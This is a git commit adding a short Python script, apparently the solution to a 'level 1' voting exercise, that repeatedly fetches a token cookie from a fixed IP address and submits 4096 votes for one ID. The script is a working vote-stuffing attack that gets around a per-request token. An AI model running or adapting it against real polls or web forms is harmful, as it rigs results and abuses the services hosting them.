7e3778ae56826d8378e3d698400b61fe7afec159
Lizzie Turner <hello@lizzieturner.com>
2018-05-20 22:08:09 +0000

    Create level_1

---
+++ level_1/level_1.py
@@ -0,0 +1,11 @@
+#!/usr/bin/python3
+""" this module contains a script to vote for id 355 4096 times """
+import requests
+
+
+for i in range(4096):
+    url = 'http://158.69.76.135/level1.php'
+    page = requests.get(url)
+    pw = page.cookies['HoldTheDoor']
+    my_data = {'id': '355', 'holdthedoor': 'Submit', 'key': pw}
+    res = requests.post(url, data=my_data, cookies={"HoldTheDoor":pw})
